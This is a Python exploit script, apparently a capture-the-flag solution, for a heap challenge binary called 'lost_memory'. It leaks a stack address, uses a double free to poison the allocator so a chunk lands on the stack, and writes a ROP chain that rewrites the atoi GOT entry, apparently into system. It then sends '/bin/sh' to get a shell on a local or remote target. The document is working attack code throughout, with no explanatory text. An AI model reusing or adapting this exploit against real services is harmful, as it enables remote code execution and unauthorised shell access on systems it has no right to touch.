#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
from time import sleep

context.log_level = 'debug'
context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
exe = context.binary = ELF('./lost_memory_patched', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
b *0x4014E7
b *0x4016B0
b *0x4015A5
b *0x40175B
c
'''

def start(argv=[]):
    if args.GDB:
        p = process([exe.path] + argv, aslr=False)
        gdb.attach(p, gdbscript=gdbscript)
        pause()
        return p
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2])
    elif args.DOCKER:
        p = remote("localhost", 5000)
        sleep(0.5)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv)

def choice(option: int):
    slna(b'choice:\n', option)

def alloc(size):
    choice(1)
    slna(b'like?\n', size)

def write(data):
    choice(2)
    sla(b'write?\n', data)

def free():
    choice(4)

def show():
    choice(5)
    ru(b'return value: ')
    return rl()[:-1]

# ==================== EXPLOIT ====================
p = start()

alloc(0x100) # 0
stack_leak = int(show(), 16)
success('stack leak @ %#x', stack_leak)

free()
write(b'0'*8)
free()

write(p64(stack_leak + 0x18))
alloc(0x100)
alloc(0x100)

pop_rdx_rbp = 0x401759
add_ptr     = 0x40125c
ret         = 0x40101a

write(flat(
    0xdeadbeef,
    pop_rdx_rbp,
    0xdce0, exe.got.atoi + 0x3d,
    add_ptr,
    ret,
    exe.sym.main
))

choice(6)
sl(b'/bin/sh\0')

interactive()
